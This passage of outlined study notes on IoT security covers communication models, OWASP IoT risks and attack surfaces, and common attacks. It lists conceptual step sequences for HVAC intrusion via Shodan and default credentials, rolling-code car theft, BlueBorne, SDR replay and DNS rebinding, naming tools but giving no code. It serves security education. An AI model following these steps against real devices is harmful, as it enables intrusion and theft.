				- In this model, interconnected devices interact with each other directly over the Internet, primarily using protocols such as ZigBee, Z-Wave, or Bluetooth. Device-to-device communication is commonly found in smart home systems, including thermostats, light bulbs, door locks, CCTV cameras, and refrigerators, where devices exchange small data packets at low data rates.
				- This model is also widely used in wearable technology. For example, an ECG/EKG device attached to a patient can pair with a smartphone and send notifications in case of an emergency.
			- Device-to-Cloud Communication Model:
				- In this model, devices communicate with the cloud instead of directly interacting with the client to send or receive data or commands. Communication protocols such as Wi-Fi, Ethernet, and sometimes Cellular networks are used for this purpose.
				- For example, a Wi-Fi-based CCTV camera allows remote access via a smartphone. In this scenario, the device (CCTV camera) does not communicate directly with the client. Instead, it first sends data to the cloud. The client can then access the cloud by entering the correct credentials, which subsequently grants access to the device.
			- Device-to-Gateway Communication Model:
				- In this model, an IoT device communicates with an intermediate device, called a gateway, which then interacts with the cloud service. The gateway could be a smartphone, hub, or another intermediary that provides security features and data or protocol translation. Common communication protocols for this model include ZigBee and Z-Wave.
				- For instance, if the application-layer gateway is a smartphone, it may function as an app that connects both the IoT device and the cloud. A smart TV, for example, may use a mobile app to connect to a cloud service.
			- Back-End Data-Sharing Communication Model:
				- This model is an extension of the device-to-cloud communication model, allowing authorized third parties to access data from IoT devices. Here, devices upload data to the cloud, where it can be analyzed or utilized by external entities.
				- For example, a company’s yearly or monthly energy consumption data can be collected and analyzed by a third party. The analysis can help reduce energy costs by implementing energy-saving or energy-harvesting techniques.
		- Challenges of IoT:
			- The rapid growth of Internet of Things (IoT) technology has made it ubiquitous across industries. While IoT devices offer numerous applications and features, their lack of fundamental security measures makes them easy targets for hackers. Additionally, frequent upgrades to IoT devices sometimes introduce new security vulnerabilities, further exacerbating the risks. To address these challenges, manufacturers must prioritize security at every stage—from planning and design to deployment, implementation, management, and maintenance.
			- Below are some of the key challenges that make IoT devices vulnerable to security threats:
				- Lack of Security and Privacy: Most IoT devices—including household appliances, industrial equipment, healthcare devices, and automobiles—are connected to the Internet and contain sensitive data. However, many of these devices lack even basic security and privacy measures, making them highly susceptible to malicious attacks.
				- Vulnerable Web Interfaces: Many IoT devices are equipped with embedded web servers, which often introduce security vulnerabilities, leaving devices open to cyberattacks.
				- Legal, Regulatory, and Compliance Issues: The interconnected nature of IoT raises significant legal and regulatory concerns, particularly as existing laws often fail to fully address the complexities of IoT security and data privacy.
				- Weak, Default, and Hardcoded Credentials: A major cause of cyberattacks on IoT devices is weak authentication. Many devices come with default or hardcoded credentials that attackers can easily exploit to gain unauthorized access.
				- Use of Clear-Text Protocols and Open Ports: Many IoT devices transmit data without encryption, relying on insecure protocols that send data in plain text. Additionally, unnecessary open ports increase exposure to cyber threats.
				- Software Vulnerabilities and Coding Errors: IoT devices often rely on embedded web services that are susceptible to the same vulnerabilities affecting traditional web applications, including buffer overflows, SQL injection, and other coding flaws.
				- Limited Storage Capacity: Most IoT devices have minimal storage capacity, yet they continuously collect and transmit vast amounts of data. This leads to challenges in data storage, management, and security.
				- Difficult Firmware and OS Updates: Firmware updates are essential for addressing security vulnerabilities. However, in many cases, updates can disrupt device functionality, leading manufacturers to delay or even forgo necessary fixes.
				- Interoperability Issues: One of the biggest challenges in IoT is the lack of standardization across devices. This affects manufacturers’ ability to test APIs, secure devices with third-party software, and ensure smooth integration and management.
				- Physical Theft and Tampering: IoT devices are often susceptible to physical attacks. Hackers can tamper with devices to inject malicious code or modify hardware components, potentially compromising their functionality. Additionally, counterfeit IoT devices pose a significant security risk.
				- Lack of Vendor Support for Security Fixes: Many IoT device manufacturers are reluctant to provide long-term support or firmware updates to address security vulnerabilities, leaving devices exposed to potential threats.
				- Economic and Development Challenges: The rapid expansion of IoT introduces new layers of complexity for policymakers, requiring them to develop new regulations and blueprints to address emerging security concerns.
				- Handling Unstructured Data: As the number of connected devices increases, organizations must deal with large volumes of unstructured data. Proper data management is crucial to identify actionable insights while ensuring security and compliance.
				- Scalability Challenges: With the continuous increase in IoT devices, scaling and managing IoT infrastructure becomes more complex, necessitating efficient data management and analytics solutions.
				- Power Consumption Constraints: Many IoT devices rely on battery power, making energy efficiency a key challenge. Optimizing power consumption is essential to extend device lifespan and maintain functionality.
				- Regulatory Compliance: IoT deployments must comply with varying regulations and industry standards related to data security, privacy, and protection, which differ across regions and sectors.
				- Integration with Legacy Systems: Seamlessly incorporating IoT technology into existing infrastructures can be difficult, requiring careful planning to ensure compatibility with legacy systems.
		- Threat vs. Opportunity:
			- If misconfigured and misapprehended, the Internet of Things (IoT) poses an unprecedented risk to personal data, privacy, and safety. However, if properly understood and protected, IoT can enhance transmissions, communications, service delivery, and overall quality of life.
			- The threats to IoT fall into three primary categories: security, privacy, and safety. These categories are interrelated, as they all involve the same devices and their connectivity. The significance of these concerns is evident—IoT devices are becoming even more pervasive than smartphones and have access to highly sensitive personal information, including health records, financial data, and social security numbers.
			- For example, while smartphones and tablets present limited risks in these areas, IoT devices exponentially increase the number and complexity of security concerns. Given the extent of data IoT devices can access, ensuring security, privacy, and safety is paramount.
			- By prioritizing these three areas and implementing the necessary protective measures, we can achieve secure communication between endpoints, reduced cyber-attacks, an improved user experience, cost savings, and efficiency gains.
		- IoT Security Problems:
			Potential vulnerabilities in IoT systems can pose significant risks to organizations. Many IoT devices have security flaws, including the lack of proper authentication mechanisms, reliance on default credentials, absence of a lockout mechanism, weak encryption schemes, inadequate key management systems, and poor physical security.
		- OWASP Top 10 IoT Threats (owasp.org):
			- The Open Web Application Security Project (OWASP) identifies the top 10 security threats affecting Internet of Things (IoT) devices:
			- Weak, Guessable, or Hardcoded Passwords: Using weak, guessable, or hardcoded passwords allows attackers to exploit publicly available or unchangeable credentials through brute-force attacks. This also includes backdoors in firmware or client software, which can lead to unauthorized access to deployed devices.
			- Insecure Network Services: Insecure network services are vulnerable to various attacks, such as buffer overflow exploits, which can cause denial-of-service (DoS) conditions, making the device inaccessible. Attackers use automated tools like port scanners and fuzzers to detect open ports and exploit them, potentially compromising the confidentiality, authenticity, integrity, and availability of information.
			- Insecure Ecosystem Interfaces: Insecure ecosystem interfaces—including web, backend APIs, mobile, and cloud interfaces—can compromise device security. Common vulnerabilities include a lack of authentication and authorization, weak or missing encryption, and inadequate input/output validation.
			- Lack of Secure Update Mechanisms: Failing to implement secure update mechanisms—such as firmware validation, secure delivery, anti-rollback protections, and security notifications—leaves devices vulnerable to various attacks.
			- Use of Insecure or Outdated Components: Using outdated software components, insecure custom OS platforms, or third-party hardware/software from compromised supply chains increases the risk of device compromise.
			- Insufficient Privacy Protection: Inadequate privacy protections can expose users' personal information stored on devices or within the ecosystem, leading to data breaches.
			- Insecure Data Transfer and Storage: A lack of encryption and access controls for data in transit or at rest can result in unauthorized access and leakage of sensitive information.
			- Lack of Device Management: Insufficient security support for device management—including asset management, update management, secure decommissioning, system monitoring, and incident response—can leave devices vulnerable to attacks.
			- Insecure Default Settings: Devices with insecure or insufficient default settings may prevent operators from configuring them securely, leaving them exposed to potential threats.
			- Lack of Physical Hardening: Failing to implement physical security measures can allow attackers to extract sensitive information, enabling remote attacks or local device control.
		- OWASP IoT Attack Surface Areas (owasp.org):
			- The OWASP IoT attack surface areas are categorized as follows:
			- Ecosystem (General)
				- Interoperability standards
				- Data governance
				- System-wide failure risks
				- Individual stakeholder risks
				- Implicit trust between components
				- Enrollment security
				- Secure decommissioning
				- Lost access procedures
			- Device Memory
				- Sensitive data storage vulnerabilities:
					- Cleartext usernames
					- Cleartext passwords
					- Third-party credentials
					- Encryption keys
			- Device Physical Interfaces
				- Firmware extraction risks
				- User CLI & Admin CLI vulnerabilities
				- Privilege escalation
				- Reset to an insecure state
				- Removal of storage media
				- Lack of tamper resistance
				- Debug port exposure:
					- UART (Serial)
					- JTAG/SWD
				- Device ID/serial number exposure
			- Device Web Interface
				- Common web application vulnerabilities:
					- OWASP Web Top 10
					- OWASP ASVS
					- OWASP Testing Guide
				- Credential management flaws:
					- Username enumeration
					- Weak passwords
					- Lack of account lockout
					- Known default credentials
					- Insecure password recovery mechanisms
			- Device Firmware
				- Exposure of sensitive data (per OWASP Top 10 – A6 Sensitive Data Exposure):
					- Backdoor accounts
					- Hardcoded credentials
					- Encryption keys
					- Weak encryption (symmetric, asymmetric)
					- Sensitive information leaks
					- Sensitive URL disclosure
				- Firmware version exposure & outdated updates
				- Vulnerable services (Web, SSH, TFTP, etc.):
					- Risks from outdated software versions (Heartbleed, Shellshock, outdated PHP, etc.)
				- Security-related function API exposure
				- Risk of firmware downgrades
			- Device Network Services
				- Information disclosure
				- User CLI & Admin CLI vulnerabilities
				- Injection attacks
				- Denial of Service (DoS) risks
				- Unencrypted services
				- Poor encryption implementation
				- Presence of test/development services
				- Buffer overflow risks
				- Vulnerable protocols (UPnP, UDP)
				- OTA update vulnerabilities:
					- Firmware loading over insecure channels (no TLS)
					- Replay attacks
					- Lack of payload verification
					- Missing message integrity checks
				- Credential management weaknesses:
					- Username enumeration
					- Weak passwords
					- Lack of account lockout
					- Known default credentials
					- Insecure password recovery mechanisms
				- Standard web application vulnerabilities:
					- OWASP Web Top 10
					- OWASP ASVS
					- OWASP Testing Guide
			- Administrative Interface
				- Credential management flaws
				- Weak security & encryption options
				- Insecure logging mechanisms
				- Absence of two-factor authentication
				- Exposure to insecure direct object references (IDOR)
				- Inability to wipe the device securely
			- Local Data Storage
				- Unencrypted data storage
				- Encryption using exposed keys
				- Lack of data integrity checks
				- Use of static, shared encryption keys
			- Cloud Web Interface
				- Standard web application vulnerabilities:
					- OWASP Web Top 10
					- OWASP ASVS
					- OWASP Testing Guide
				- Weak credential management:
					- Username enumeration
					- Weak passwords
					- Lack of account lockout
					- Known default credentials
					- Insecure password recovery mechanisms
				- Weak transport encryption
				- Lack of two-factor authentication
			- Third-Party Backend APIs
				- Unencrypted transmission of Personally Identifiable Information (PII)
				- Unintentional exposure of device information
				- Location data leaks
			- Update Mechanism
				- Updates sent without encryption
				- Unsigned updates
				- Writable update locations
				- Lack of update verification & authentication
				- Potential for malicious updates
				- Missing update mechanisms
				- Absence of manual update options
			- Mobile Application
				- Implicit trust by device or cloud
				- Credential management vulnerabilities:
					- Username enumeration
					- Weak passwords
					- Lack of account lockout
					- Known default credentials
				- Insecure data storage
				- Weak transport encryption
				- Insecure password recovery mechanisms
				- Lack of two-factor authentication
			- Vendor Backend APIs
				- Inherent trust in cloud or mobile applications
				- Weak authentication mechanisms
				- Poor access controls
				- Vulnerability to injection attacks
				- Presence of hidden services
			- Ecosystem Communication
				- Health check vulnerabilities
				- Heartbeat message risks
				- Exploitable ecosystem commands
				- Insecure deprovisioning mechanisms
				- Risks in pushing updates
			- Network Traffic
				- LAN traffic security risks
				- LAN-to-Internet traffic vulnerabilities
				- Short-range communication vulnerabilities
				- Use of non-standard protocols
				- Wireless communication risks:
					- Wi-Fi, Z-Wave, XBee, Zigbee, Bluetooth, LoRa
				- Protocol fuzzing risks
			- Authentication & Authorization
				- Exposure of authentication/authorization-related values (session keys, tokens, cookies)
				- Reuse of session keys or tokens
				- Weak device-to-device authentication
				- Weak authentication between:
					- Device & mobile application
					- Device & cloud system
					- Mobile application & cloud system
					- Web application & cloud system
				- Lack of dynamic authentication mechanisms
			- Privacy Risks
				- User data disclosure
				- Exposure of user/device location
				- Absence of differential privacy protections
			- Hardware (Sensors)
				- Susceptibility to sensing environment manipulation
				- Physical tampering risks
				- Potential for physical damage
		- IoT Vulnerabilities (owasp.org):
			- The OWASP IoT vulnerabilities are listed below:
			- Username Enumeration
			- Weak Passwords
			- Lack of Account Lockout Mechanism
			- Unencrypted Services
			- Lack of Two-Factor Authentication
			- Poorly Implemented Encryption
			- Updates Sent Without Encryption
			- Writable Update Location
			- Denial of Service (DoS) Attacks
			- Removal of Storage Media Leading to Data Exposure
			- No Manual Update Mechanism
			- Missing or Insecure Update Mechanism
			- Firmware Version and Last Update Date Disclosure
			- Firmware and Storage Extraction Vulnerabilities
			- Manipulation of the Device’s Code Execution Flow
			- Unauthorized Console Access
			- Use of Insecure Third-Party Components
		- IoT Threats:
			- IoT devices have minimal security protection against various emerging threats. These devices can be infected by malware or malicious code at an alarming rate. Attackers often exploit these poorly secured devices to cause physical damage to networks, eavesdrop on communications, and launch disruptive attacks such as Distributed Denial-of-Service (DDoS) attacks.
			- Below are some common types of IoT attacks:
				- Attack on HVAC Systems: Vulnerabilities in HVAC systems are exploited by attackers to steal confidential information, such as user credentials, and to launch further attacks on the target network.
				- DDoS Attack: An attacker converts IoT devices into an army of botnets to target a specific system or server, rendering it unavailable for legitimate users.
				- Rolling Code Attack: An attacker jams and intercepts signals to obtain the rolling code used by a vehicle’s receiver, allowing them to unlock and steal the vehicle.
				- BlueBorne Attack: Attackers connect to nearby devices and exploit Bluetooth protocol vulnerabilities to compromise them.
				- Jamming Attack: An attacker floods the communication channel with malicious traffic, disrupting the signal between the sender and receiver and preventing them from communicating.
				- Remote Access Using a Backdoor: Attackers exploit vulnerabilities in IoT devices to create a backdoor, enabling unauthorized access to an organization’s network.
				- Remote Access Using Telnet: Attackers exploit an open Telnet port to intercept information shared between connected devices, including software and hardware details.
				- Sybil Attack: An attacker creates multiple forged identities to simulate traffic congestion, disrupting communication between network nodes.
				- Exploit Kits: Attackers use malicious scripts to exploit unpatched vulnerabilities in IoT devices.
				- Man-in-the-Middle (MitM) Attack: An attacker intercepts and manipulates communication between the sender and receiver, impersonating one of the parties to hijack the data exchange.
				- Replay Attack: Attackers capture legitimate communication messages and repeatedly send them to the target device, leading to denial-of-service or device crashes.
				- Forged Malicious Device: Attackers physically replace genuine IoT devices with compromised ones to infiltrate networks.
				- Side-Channel Attack: Attackers extract encryption keys and other sensitive data by analyzing signals emitted from IoT devices, such as electromagnetic leaks or power consumption patterns.
				- Ransomware Attack: Ransomware encrypts a user’s device or files, locking access until a ransom is paid.
				- Client Impersonation: An attacker masquerades as a legitimate smart device or server using a malicious device, compromising IoT clients to perform unauthorized activities or steal sensitive data.
				- SQL Injection Attack: Attackers exploit vulnerabilities in mobile or web applications controlling IoT devices to gain unauthorized access and execute malicious commands.
				- SDR-Based Attack: Using software-defined radio (SDR) technology, attackers analyze IoT network communication signals and send spam messages to interconnected devices.
				- Fault Injection Attack: Attackers deliberately introduce faults into IoT devices to exploit security weaknesses and compromise their functionality.
				- Network Pivoting: Attackers use a compromised smart device to access a closed server and pivot through the network to steal sensitive information.
				- DNS Rebinding Attack: Attackers use malicious JavaScript on a web page to bypass same-origin policies and gain unauthorized access to a victim’s router.
				- Firmware Update (FOTA) Attack: Attackers intercept and manipulate the firmware update process to inject malicious code into IoT devices.
		- Hacking IoT Devices: General Scenario:
			- The Internet of Things (IoT) encompasses various technologies, including embedded sensors, microprocessors, and power management devices. Security considerations vary depending on the device and its application. The more confidential data transmitted across the network, the higher the risk of data theft, manipulation, tampering, and attacks on routers and servers.
			- An inadequate security infrastructure can lead to the following threats:
				- Eavesdropping: A malicious actor intercepts communication between two endpoints and accesses confidential information. They can then misuse this data for personal gain.
				- Fake Servers: An attacker may set up a rogue server to send unauthorized commands, triggering unintended actions. For example, essential resources such as water, coal, oil, or electricity could be redirected to an unknown or unauthorized destination.
				- Malicious Device Injection: A compromised device could inject harmful scripts into the system, forcing it to operate under the attacker's control. This may lead to erratic or dangerous system behavior.
		- DDoS Attack:
			- A Distributed Denial-of-Service (DDoS) attack is a cyberattack in which multiple compromised systems overwhelm a single online system or service, rendering it slow, unresponsive, or completely unavailable to legitimate users.
			- The attacker initiates the attack by exploiting vulnerabilities in devices and installing malicious software on them. These compromised devices form a botnet army. Once the attacker selects a target, they instruct the botnets (or zombie agents) to flood the target server with requests. Because these requests originate from multiple IoT devices across different locations, the server becomes overwhelmed, leading to degraded performance, downtime, or a complete shutdown.
			- Steps of a DDoS Attack on IoT Devices:
				- The attacker gains remote access to vulnerable IoT devices.
				- After gaining access, they inject malware to turn the devices into botnets.
				- The attacker uses a command-and-control center to direct the botnets to send massive requests to the target server.
				- The target server becomes overwhelmed and goes offline, making it unavailable for legitimate users.
		- Exploiting HVAC Systems:
			- Many organizations use Internet-connected heating, ventilation, and air conditioning (HVAC) systems without implementing proper security measures, providing attackers with a gateway to infiltrate corporate networks. HVAC systems have numerous security vulnerabilities that attackers exploit to steal login credentials, gain unauthorized access, and launch further attacks on an organization’s network.
			- These systems are commonly connected to the networks of various industries, government agencies, and hospitals. They often provide remote access rights to HVAC vendors and third parties for remote administration, such as monitoring energy consumption and temperature levels. Additionally, many HVAC companies use common login credentials across multiple organizations, making it easier for attackers to gain remote access and steal confidential information.
			- Steps Attackers Follow to Exploit HVAC Systems:
				- The attacker uses Shodan (https://www.shodan.io) to search for vulnerable industrial control systems (ICS).
				- Based on the vulnerable ICSs found, the attacker searches for default user credentials using online tools like Default Password (https://www.defpass.com).
				- The attacker attempts to access the ICS using default credentials.
				- After gaining access to the ICS, the attacker tries to remotely access the HVAC system.
				- Once inside the HVAC system, the attacker can manipulate temperature settings or launch further attacks on the local network.
			- By exploiting these vulnerabilities, attackers can compromise an organization's security, disrupt operations, and steal sensitive data. Implementing robust security measures, such as strong authentication, network segmentation, and regular security audits, is essential to protect against such threats.
		- Rolling Code Attack:
			- Most modern vehicles use smart locking systems, which rely on an RF signal transmitted as a unique code from a key fob to lock or unlock the vehicle. Each code is used only once and changes with every use. If a vehicle receives the same code again, it rejects it. This mechanism prevents replay attacks and is known as a rolling code or hopping code.
			- However, an attacker can intercept and exploit this system. By using a jamming device, the attacker blocks the vehicle from receiving the rolling code while simultaneously capturing it. Later, the attacker can use the intercepted code to gain unauthorized access to the vehicle or garage.
			- Steps of a Rolling Code Attack:
				- The victim presses the car remote to unlock the vehicle.
				- The attacker uses a jammer to block the car from receiving the rolling code while simultaneously capturing the first code.
				- Since the car does not unlock, the victim tries again, sending a second code.
				- The attacker captures the second code.
				- The attacker then forwards the first captured code, unlocking the vehicle.
				- Later, the attacker uses the recorded second code to unlock and steal the vehicle.
			- Attackers commonly use tools such as HackRF One and RFCrack to execute this attack.
		- BlueBorne Attack:
			- A BlueBorne attack targets Bluetooth connections to gain unauthorized access and take full control of a device. Attackers connect to nearby devices and exploit vulnerabilities in the Bluetooth protocol to compromise them. BlueBorne refers to a collection of techniques that leverage known weaknesses in Bluetooth security.
			- This attack can be executed on various IoT devices, including those running Android, Linux, Windows, and older versions of iOS. Since the Bluetooth process has high privileges in all operating systems, an attacker who gains access to one device can use it to infiltrate corporate networks, steal sensitive data, and spread malware to other nearby devices.
			- BlueBorne is highly dangerous because it works on all software versions and does not require user interaction, specific conditions, or prior configuration—other than having Bluetooth enabled. The attacker can establish a connection with the target device without pairing. Additionally, the attack allows an attacker to discover Bluetooth-enabled devices even if they are not in active discovery mode.
			- Once a vulnerable device is identified, the attacker extracts its MAC address and operating system (OS) information to exploit OS-specific vulnerabilities. Depending on the weaknesses in the Bluetooth protocol, attackers can execute remote code or perform man-in-the-middle attacks, compromising the target device entirely.
			- Steps to Perform a BlueBorne Attack:
				- The attacker scans for active Bluetooth-enabled devices nearby. Even if a device is not in discoverable mode, it can still be located.
				- Once a device is found, the attacker retrieves its MAC address.
				- The attacker sends continuous probes to determine the device’s operating system.
				- After identifying the OS, the attacker exploits vulnerabilities in the Bluetooth protocol to gain access.
				- The attacker can then execute remote code, perform a man-in-the-middle attack, and take full control of the device.
			- This attack poses a significant risk to various IoT devices, including smart TVs, smartphones, smartwatches, car audio systems, printers, and more.
		- Jamming Attack:
			- A jamming attack is a type of cyberattack in which communication between wireless IoT devices is deliberately disrupted to compromise their functionality. During this attack, a high volume of malicious traffic is transmitted, leading to a Denial-of-Service (DoS) attack that obstructs legitimate communication and prevents endpoints from interacting with each other.
			- Every wireless device and network is vulnerable to this type of attack. Attackers use specialized hardware to transmit radio signals at the same frequency as the target device, creating interference. The jamming signals appear as noise to wireless devices, causing them to delay or cease transmissions until the interference stops. As a result, the network becomes jammed, and devices are unable to send or receive data.
		- Hacking Smart Grid/Industrial Devices: Remote Access Using a Backdoor:
			- Attackers gather basic information about the target organization using various social engineering techniques. After obtaining details such as employee email addresses, they send phishing emails containing malicious attachments (e.g., a Word document). When an employee opens the email and clicks on the attachment, a backdoor is automatically installed on the target system.
			- Using this backdoor, the attacker gains access to the organization's private network. For example, in an attack on a power grid, once inside the private network, the attacker can infiltrate the Supervisory Control and Data Acquisition (SCADA) system that manages the grid. After compromising the SCADA network, the attacker replaces legitimate firmware with malicious firmware designed to execute their commands. Finally, the attacker can disrupt the power supply to specific locations by sending unauthorized commands to substation control systems via the SCADA network.
		- SDR-Based Attacks on IoT:
			- Software-defined radio (SDR) is a method of generating radio communications and implementing signal processing using software (or firmware) instead of traditional hardware components. By leveraging self-created SDR systems, attackers can analyze communication signals in IoT networks and inject spam content or malicious messages into interconnected devices. Additionally, SDR systems can modify the transmission and reception of signals between devices, depending on their software implementations. These attacks can target both full-duplex (two-way communication) and half-duplex (one-way communication) transmission modes.
			- Types of SDR-Based Attacks on IoT Environments:
				- Replay Attack:
					- A replay attack is one of the most common threats to IoT networks. In this attack, an attacker captures a command sequence from connected devices and retransmits it later to manipulate the system.
					- Steps involved in launching a replay attack:
						- The attacker identifies the specific frequency used for communication between IoT devices.
						- Once the frequency is obtained, the attacker captures the original data when commands are transmitted.
						- The captured data is then processed using free tools such as Universal Radio Hacker (URH) to extract and segregate the command sequence.
						- Finally, the attacker injects the extracted command sequence back into the IoT network on the same frequency, replaying the captured signals to manipulate device behavior.
				- Cryptanalysis Attack:
					- A cryptanalysis attack is a more advanced type of SDR-based attack. It follows the same procedure as a replay attack but includes an additional step—reverse-engineering the communication protocol to extract the original signal.
					- To execute this attack, an attacker must have expertise in cryptography, communication theory, and modulation schemes to filter out noise from the signal. Although more complex than a replay attack, a skilled attacker can still attempt to break IoT security using specialized tools and techniques.
				- Reconnaissance Attack:
					- A reconnaissance attack is an extension of a cryptanalysis attack, focusing on gathering information from the device’s specifications.
					- All IoT devices that operate using RF signals must be certified by regulatory authorities in their respective countries, and official reports often disclose device analysis details. To counteract this, manufacturers sometimes obscure identification markings on the chipset. However, attackers can use multimeters to analyze the chipset and identify key components, such as ground pins, to determine the product ID. They can then compare this ID with published reports to gather intelligence about the device’s vulnerabilities.
		- Identifying and Accessing Local IoT Devices:
			- An attacker can gain control over local IoT devices when a user on the network visits a malicious webpage—crafted and distributed by the attacker through advertisements or other enticing means. Once the victim accesses the malicious website, embedded JavaScript code is executed to initiate the attack.
			- Attackers typically use two methods to compromise local IoT devices, as discussed below:
			- Discovering or Identifying Local IoT Devices:
				- The attacker’s first step is to identify target devices and gather information about all connected devices within the network.
				- To achieve this, the attacker follows these steps:
					- Obtain the local IP address using the malicious JavaScript code.
					- Request a list of available devices within the network.
					- Analyze responses:
						- Active devices respond with a reset packet.
						- Inactive devices result in a timeout.
					- Identify all available devices based on their responses.
			- Accessing Local IoT Devices Using DNS Rebinding:
				- DNS rebinding is an attack technique that allows an attacker to gain control over the victim’s router and other local devices through a malicious JavaScript code injected into a webpage. Once executed, the attacker can exploit devices using default credentials.
				- After identifying connected devices and their details, the attacker proceeds as follows:
					- Check for DNS rebinding vulnerabilities in discovered devices using tools like Singularity of Origin.
					- Execute DNS rebinding, enabling the attacker to establish command and control over local IoT devices.
					- Extract sensitive information, such as UIDs and BSSIDs of local access points, which can help determine the geographical location of the target devices.
				- Once the attack is successfully executed, the attacker can bypass security measures and access applications running on local IoT devices. Additionally, they may manipulate devices by playing random audio or video files through web browsers.
		- Fault Injection Attacks:
			- Fault injection attacks, also known as perturbation attacks, occur when an attacker deliberately introduces faults into a system to compromise its security. These faults can be induced using various techniques and can be classified as either invasive or non-invasive.
				- Non-invasive attacks require the attacker to be in close physical proximity to the chip to manipulate its program or data and extract sensitive information.
				- Invasive attacks involve direct physical access to the chip’s surface, allowing the attacker to manipulate it at a hardware level.
			- Below are different types of fault injection attacks:
				- Optical, Electromagnetic Fault Injection (EMFI), and Body Bias Injection (BBI): These attacks introduce faults by projecting lasers or electromagnetic pulses onto critical analog components, such as random number generators (RNGs), or by applying high-voltage pulses. Attackers exploit these faults to undermine system security.
				- Power, Clock, and Reset Glitching: In these attacks, faults or glitches are injected into the power supply to cause unintended behavior, such as remote execution or skipping key instructions. Attackers can also manipulate the clock network responsible for synchronizing signals across the chip.
				- Frequency and Voltage Tampering: Here, attackers alter the chip's operating conditions by modifying the power supply levels or clock frequency. The goal is to induce faults that weaken device security.
				- Temperature Attacks: By changing the chip's operating temperature, attackers disrupt its normal functionality, forcing it to operate outside nominal conditions, potentially leading to security vulnerabilities.
			- Once faults are successfully injected, attackers can exploit the resulting behavior to steal sensitive data or disrupt the device’s normal operations.
		- Sybil Attack:
			- Vehicular communications play a crucial role in safe transportation by exchanging important safety messages and traffic updates. However, even vehicular ad-hoc networks (VANETs) are vulnerable to attackers. In a Sybil attack, an attacker uses multiple forged identities to create the illusion of traffic congestion, disrupting communication between neighboring nodes and networks.
			- This type of attack significantly impacts network performance and is considered one of the most serious threats to VANETs. To execute the attack, an attacker falsely claims that a single vehicle is present in multiple locations simultaneously. For example, suppose a malicious node, referred to as "X", spoofs multiple identities to deceive other nodes, "A" and "B". Normally, A and B should only communicate with each other, but X intervenes as a known internal node, manipulating network communication and causing security risks.
		- Exploit Kits:
			- An exploit kit is a malicious script used by attackers to exploit unpatched vulnerabilities in IoT devices. These kits are designed to update automatically whenever new vulnerabilities are discovered, allowing attackers to continually refine their methods.
			- Once vulnerabilities are detected, the exploit kit sends a targeted attack to install malware, which can execute harmful commands, corrupt the device, or even render it inoperable. Exploit kits pose a significant threat because they often go undetected, making them highly effective in compromising IoT devices and infrastructure.
		- Man-in-the-Middle (MitM) Attack:
			- In a man-in-the-middle attack, an attacker intercepts communication between a sender and a receiver, posing as a legitimate participant to hijack the conversation. Since IoT devices are usually connected to networks and store sensitive information, they become prime targets for such attacks.
			- Attackers can exploit IoT vulnerabilities to send malicious requests and gain unauthorized access to devices. IoT devices such as IP-enabled cameras, routers, modems, and internet gateways often lack strong cryptographic protection, making them susceptible to MitM attacks.
		- Replay Attack:
			- A replay attack occurs when an attacker intercepts and records a legitimate communication, then repeatedly sends the same message to the target device. This can be used to execute a denial-of-service (DoS) attack, manipulate messages, or crash the target device.
			- For example, consider a replay attack on an IoT-powered smart lock. If an attacker records the infrared signal used to unlock a front door, they can later retransmit the same signal to gain unauthorized entry.
		- Forged Malicious Device:
			- In this attack, attackers physically replace authentic IoT devices with malicious counterparts. Since the forged device closely resembles the original, detecting such an attack is extremely difficult. These malicious devices often contain hidden backdoors, allowing attackers to infiltrate and manipulate the network for various malicious purposes.
		- Side-Channel Attack:
			- A side-channel attack exploits information leaked from an IoT device’s power consumption, electromagnetic emissions, or other physical characteristics to extract encryption keys. Every computing device emits small amounts of data that can be observed and analyzed by attackers.
			- By carefully studying these emissions, attackers can deduce sensitive information, such as encryption keys, without directly tampering with the device. This attack method is particularly dangerous because it requires minimal effort and time. Additionally, attackers can use this information to execute more advanced power-analysis and timing-based attacks.
		- Ransomware Attack:
			- Ransomware is a type of malware that encrypts a user’s files or locks their device, preventing access until a ransom is paid. Users often encounter ransomware through malicious software downloads, phishing emails, or malvertisements (malicious advertisements).
			- Phases of a Ransomware Attack:
				- Infection: The victim receives an email that appears to be from a legitimate sender. The email contains an attachment with a malicious file.
				- Execution:
					- The victim opens the email and clicks on the malicious attachment, unknowingly downloading the ransomware.
					- The malware executes and launches processes like PowerShell, Vssadmin, or cmd.exe, connecting the device to the attacker's Command & Control (C&C) server.
					- The victim’s personal files are encrypted.
				- Extortion: A ransom notification appears on the victim's device, demanding payment (often in cryptocurrency like Bitcoin) to restore access to the encrypted files.
		- IoT Attacks in Different Sectors:
			- IoT technology is advancing across various sectors, including industry, healthcare, agriculture, smart cities, security, and transportation. However, due to the decentralized nature of IoT systems, organizations often place less emphasis on securing these devices. Instead of segmenting IoT technology into different parts for better security, suppliers tend to focus more on identifying vulnerabilities, which can then be exploited by attackers.
			- These vulnerabilities in IoT devices can be leveraged by attackers to launch various types of attacks, such as Denial-of-Service (DoS) attacks, jamming attacks, Man-in-the-Middle (MITM) attacks, and Sybil attacks. Such attacks can lead to data breaches, compromising privacy and confidentiality.
			- Below is a list of different IoT sectors and the associated attacks they commonly face:
				- Healthcare:
					- Ransomware attacks – Encrypt patient data and demand payment for decryption.
					- Man-in-the-Middle (MITM) attacks – Intercept communication between medical devices and servers.
					- DDoS attacks – Disrupt hospital networks, making critical medical systems unavailable.
				- Industrial IoT (IIoT):
					- SCADA attacks – Target industrial control systems, causing operational disruptions.
					- Sensor spoofing – Manipulate sensor data to disrupt production.
					- Botnet attacks – Infect IoT devices to launch large-scale cyberattacks.
				- Smart Cities:
					- Jamming attacks – Disrupt communication between IoT devices in smart infrastructure.
					- Traffic signal manipulation – Hack traffic control systems to create congestion or accidents.
					- Data breaches – Compromise citizen data collected by smart city applications.
				- Transportation:
					- GPS spoofing – Manipulate GPS data to mislead autonomous vehicles.
					- Vehicle hacking – Exploit vulnerabilities in connected cars to gain unauthorized control.
					- CAN bus attacks – Target internal vehicle networks to disable critical functions.
				- Agriculture:
					- Firmware attacks – Inject malicious code into IoT-enabled farming equipment.
					- Sensor data manipulation – Alter environmental data to disrupt crop monitoring.
					- DDoS attacks – Overload smart irrigation systems to cause failures.
				- Security & Surveillance:
					- Camera hijacking – Gain unauthorized access to security cameras for spying.
					- Credential stuffing – Use leaked passwords to take control of surveillance systems.
					- Brute-force attacks – Guess weak passwords to gain access to security devices.
		- IoT Malware:
			- KmsdBot (www.akamai.com):
